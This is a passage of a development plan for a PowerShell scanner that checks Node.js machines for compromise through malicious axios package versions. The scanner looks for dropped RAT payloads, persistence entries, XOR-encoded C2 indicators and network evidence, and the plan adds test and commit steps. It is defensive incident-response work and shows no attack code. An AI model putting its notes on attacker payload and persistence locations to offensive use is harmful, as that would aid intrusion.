    [string[]]$Path         = $(if ($IsWindows -or $env:OS -eq 'Windows_NT') { @('C:\Users','C:\Dev','C:\Projects') } else { @($env:HOME,'/opt','/srv') }),
    [string]$OutputPath     = $(if ($IsWindows -or $env:OS -eq 'Windows_NT') { 'C:\Logs' } else { '/tmp' }),
    [switch]$SendEmail,
    [string]$SMTPServer,
    [int]$SMTPPort          = 587,
    [string]$FromAddress,
    [string[]]$ToAddress,
    [PSCredential]$Credential,
    [bool]$UseTLS           = $true,
    [int]$Threads           = 4
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

$pvt = Join-Path $PSScriptRoot 'Private'
. (Join-Path $pvt 'Get-NodeProjects.ps1')
. (Join-Path $pvt 'Invoke-LockfileAnalysis.ps1')
. (Join-Path $pvt 'Find-ForensicArtifacts.ps1')
. (Join-Path $pvt 'Invoke-NpmCacheScan.ps1')
. (Join-Path $pvt 'Search-DroppedPayloads.ps1')
. (Join-Path $pvt 'Find-PersistenceArtifacts.ps1')
. (Join-Path $pvt 'Search-XorEncodedC2.ps1')
. (Join-Path $pvt 'Get-NetworkEvidence.ps1')
. (Join-Path $pvt 'New-ScanReport.ps1')
. (Join-Path $pvt 'New-ExecBriefing.ps1')
. (Join-Path $pvt 'Send-ScanReport.ps1')

if ($SendEmail) {
    if (-not $SMTPServer)  { throw '-SMTPServer is required when -SendEmail is specified' }
    if (-not $FromAddress) { throw '-FromAddress is required when -SendEmail is specified' }
    if (-not $ToAddress)   { throw '-ToAddress is required when -SendEmail is specified' }
}

$null = New-Item -ItemType Directory -Path $OutputPath -Force
$hn   = $env:COMPUTERNAME ?? $env:HOSTNAME ?? 'unknown'
$ts   = Get-Date -Format 'yyyyMMdd-HHmmss'
$log  = Join-Path $OutputPath "Axios-Scan-${hn}-${ts}.log"

function Write-Log {
    param([string]$Msg, [string]$Level = 'INFO')
    $line = "[$(Get-Date -Format 'HH:mm:ss')] [$Level] $Msg"
    Write-Host $line
    Add-Content -Path $log -Value $line -ErrorAction SilentlyContinue
}

$attackWindow = [datetime]::Parse('2026-03-31T00:21:00Z').ToLocalTime()
$startTime    = Get-Date

Write-Log "Axios Compromise Scanner — 10-check suite"
Write-Log "Attack window start: $attackWindow"
Write-Log "Scanning paths: $($Path -join ', ')"

# ── Check 1: Discover Node.js projects ────────────────────────────────────────
Write-Log "[1/10] Discovering Node.js projects..."
$projects = Get-NodeProjects -Path $Path
Write-Log "Found $($projects.Count) project(s)"

# ── Checks 2 & 3: Lockfile analysis + artifact detection (parallel on PS7) ───
if ($PSVersionTable.PSVersion.Major -ge 7 -and $projects.Count -gt 0) {
    Write-Log "[2/10] Analysing lockfiles (parallel, $Threads threads)..."
    $lockfileResults = $projects | ForEach-Object -Parallel {
        . (Join-Path $using:pvt 'Invoke-LockfileAnalysis.ps1')
        Invoke-LockfileAnalysis -ProjectPath $_.ProjectPath
    } -ThrottleLimit $Threads

    Write-Log "[3/10] Detecting project-level forensic artifacts (parallel)..."
    $rawArtifacts = $projects | ForEach-Object -Parallel {
        . (Join-Path $using:pvt 'Find-ForensicArtifacts.ps1')
        Find-ForensicArtifacts -ProjectPath $_.ProjectPath
    } -ThrottleLimit $Threads
} else {
    Write-Log "[2/10] Analysing lockfiles (sequential)..."
    $lockfileResults = $projects | ForEach-Object { Invoke-LockfileAnalysis -ProjectPath $_.ProjectPath }
    Write-Log "[3/10] Detecting project-level forensic artifacts..."
    $rawArtifacts    = $projects | ForEach-Object { Find-ForensicArtifacts -ProjectPath $_.ProjectPath }
}
$artifacts = @($rawArtifacts | Where-Object { $_ })

# ── Check 4: npm cache ────────────────────────────────────────────────────────
Write-Log "[4/10] Scanning npm cache and global npm..."
$cacheFindings = Invoke-NpmCacheScan

# ── Check 5: Dropped payloads ─────────────────────────────────────────────────
Write-Log "[5/10] Searching for dropped RAT payloads in temp/appdata..."
$droppedPayloads = Search-DroppedPayloads -AttackWindowStart $attackWindow

# ── Check 6: Persistence ──────────────────────────────────────────────────────
Write-Log "[6/10] Checking persistence mechanisms (tasks, registry, startup)..."
$persistenceArtifacts = Find-PersistenceArtifacts -AttackWindowStart $attackWindow

# ── Check 7: XOR-encoded indicators ──────────────────────────────────────────
Write-Log "[7/10] Scanning for XOR-encoded C2 indicators..."
$xorFindings = Search-XorEncodedC2

# ── Check 8: Network evidence ─────────────────────────────────────────────────
Write-Log "[8/10] Checking network evidence (DNS cache, active connections, firewall log)..."
$networkEvidence = Get-NetworkEvidence

# ── Check 9: Generate report ──────────────────────────────────────────────────
$duration = (Get-Date) - $startTime
$metadata = @{
    Timestamp = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') UTC"
    Hostname  = $hn
    Username  = $env:USERNAME ?? $env:USER ?? 'unknown'
    Duration  = "$([Math]::Round($duration.TotalSeconds,1))s"
    Paths     = $Path
}

Write-Log "[9/10] Generating forensic report..."
$reportPath = New-ScanReport `
    -Projects             $projects `
    -LockfileResults      @($lockfileResults) `
    -Artifacts            $artifacts `
    -CacheFindings        $cacheFindings `
    -DroppedPayloads      $droppedPayloads `
    -PersistenceArtifacts $persistenceArtifacts `
    -XorFindings          $xorFindings `
    -NetworkEvidence      $networkEvidence `
    -OutputPath           $OutputPath `
    -ScanMetadata         $metadata

Write-Log "Technical report: $reportPath"

# ── Check 9b: Executive Briefing ──────────────────────────────────────────────
Write-Log "[9b/10] Generating executive briefing..."
$briefingPath = New-ExecBriefing `
    -ProjectCount         $projects.Count `
    -LockfileResults      @($lockfileResults) `
    -Artifacts            $artifacts `
    -CacheFindings        $cacheFindings `
    -DroppedPayloads      $droppedPayloads `
    -PersistenceArtifacts $persistenceArtifacts `
    -XorFindings          $xorFindings `
    -NetworkEvidence      $networkEvidence `
    -TechnicalReportPath  $reportPath `
    -OutputPath           $OutputPath `
    -ScanMetadata         $metadata

Write-Log "Executive briefing: $briefingPath"

# ── Check 10: Email ───────────────────────────────────────────────────────────
if ($SendEmail) {
    Write-Log "[10/10] Emailing report to $($ToAddress -join ', ')..."
    $sent = Send-ScanReport -ReportPaths @($briefingPath, $reportPath) -SMTPServer $SMTPServer -SMTPPort $SMTPPort `
        -FromAddress $FromAddress -ToAddress $ToAddress -Credential $Credential -UseTLS $UseTLS
    if ($sent) { Write-Log 'Email sent.' } else { Write-Log 'Email failed — report available locally.' 'WARN' }
} else {
    Write-Log "[10/10] Email skipped (no -SendEmail flag)"
}

# ── Summary ───────────────────────────────────────────────────────────────────
$vulnCount      = @($lockfileResults | Where-Object { $_.HasVulnerableAxios -or $_.HasMaliciousPlainCrypto }).Count
$criticalCount  = @($artifacts + $cacheFindings + $droppedPayloads + $persistenceArtifacts + $xorFindings + $networkEvidence | Where-Object { $_.Severity -eq 'Critical' }).Count

Write-Log ''
Write-Log "═══════════════════════════════════════"
Write-Log " SCAN COMPLETE — $(Get-Date -Format 'HH:mm:ss')"
Write-Log " Projects scanned    : $($projects.Count)"
Write-Log " Vulnerable (lockfile): $vulnCount"
Write-Log " Critical findings   : $criticalCount"
Write-Log " Technical report    : $reportPath"
Write-Log " Executive briefing  : $briefingPath"

if ($vulnCount -gt 0 -or $criticalCount -gt 0) {
    Write-Log ' STATUS: COMPROMISED — isolate machine and review reports' 'WARN'
    exit 1
} else {
    Write-Log ' STATUS: CLEAN — no compromise evidence found across all 10 checks'
    exit 0
}
```

- [ ] **Step 4: Run all tests**

```powershell
pwsh -Command "Invoke-Pester Tests/ -Output Detailed"
```

Expected: All tests PASSED

- [ ] **Step 5: Commit**

```bash
git add Invoke-AxiosCompromiseScanner.ps1 Tests/Invoke-AxiosCompromiseScanner.Tests.ps1
git commit -m "feat: add main orchestrator integrating all 10 checks"
```

---

## Task 14: Final Verification

- [ ] **Step 1: Full test suite**

```powershell
pwsh -Command "Invoke-Pester Tests/ -Output Detailed -CI"
```

Expected: All tests PASSED, exit code 0

- [ ] **Step 2: Smoke test — compromised fixture**

```powershell
pwsh -NonInteractive -File Invoke-AxiosCompromiseScanner.ps1 \
    -Path Tests/Fixtures/VulnerableNpmProject \
    -OutputPath /tmp/axios-scan-test
echo "Exit code: $?"
```

Expected exit code: `1`
Expected log lines include: `STATUS: COMPROMISED`

- [ ] **Step 3: Smoke test — clean fixture**

```powershell
pwsh -NonInteractive -File Invoke-AxiosCompromiseScanner.ps1 \
    -Path Tests/Fixtures/CleanProject \
    -OutputPath /tmp/axios-scan-clean
echo "Exit code: $?"
```

Expected exit code: `0`
Expected log lines include: `STATUS: CLEAN — no compromise evidence found across all 10 checks`

- [ ] **Step 4: Spot-check technical report sections**

```powershell
pwsh -Command "Get-Content (Get-ChildItem /tmp/axios-scan-test -Filter 'Axios-Scan-*.txt' | Select-Object -Last 1).FullName"
```

Verify these headings appear: `EXECUTIVE SUMMARY`, `VULNERABLE PROJECTS`, `FORENSIC ARTIFACTS`, `NPM CACHE FINDINGS`, `DROPPED PAYLOADS`, `PERSISTENCE MECHANISMS`, `XOR-ENCODED INDICATORS`, `NETWORK EVIDENCE`, `CREDENTIALS AT RISK`, `APPENDIX: IOC REFERENCE`, `REMEDIATION GUIDANCE`

- [ ] **Step 5: Spot-check executive briefing**

```powershell
pwsh -Command "Get-Content (Get-ChildItem /tmp/axios-scan-test -Filter 'ExecBriefing-*.txt' | Select-Object -Last 1).FullName"
```

Verify these appear:
- `OVERALL VERDICT:` line with `COMPROMISED` (fixture scan) or `CLEAN` (clean scan)
- Table with all 8 rows each showing `PASS` or `FAIL`
- `SECURITY CHECK RESULTS   (8 checks performed)`
- `WHAT THIS MEANS` section
- `REQUIRED ACTIONS` section
- `SCAN INTEGRITY` section with `8 of 8` and a `Report SHA256` hash line

- [ ] **Step 6: Final commit**

```bash
git add -A
git commit -m "chore: all tests passing — axios compromise scanner + exec briefing complete"
```

---

## Coverage Map

| Gap from original review | Addressed by |
|---|---|
| Dropped RAT payloads in temp/appdata | Task 6 `Search-DroppedPayloads` |
| Persistence (scheduled tasks, registry, startup) | Task 7 `Find-PersistenceArtifacts` |
| XOR-obfuscated C2 (plaintext search was blind to this) | Task 8 `Search-XorEncodedC2` |
| npm cache poisoning (persists after node_modules deleted) | Task 5 `Invoke-NpmCacheScan` |
| Global npm installation | Task 5 `Invoke-NpmCacheScan` |
| pnpm-lock.yaml not parsed | Task 3 `Invoke-LockfileAnalysis` |
| Network evidence (active C2 connection, DNS cache, firewall log) | Task 9 `Get-NetworkEvidence` |
| Already-cleaned projects falsely marked clean | Covered by checks 4–9 which are independent of node_modules |
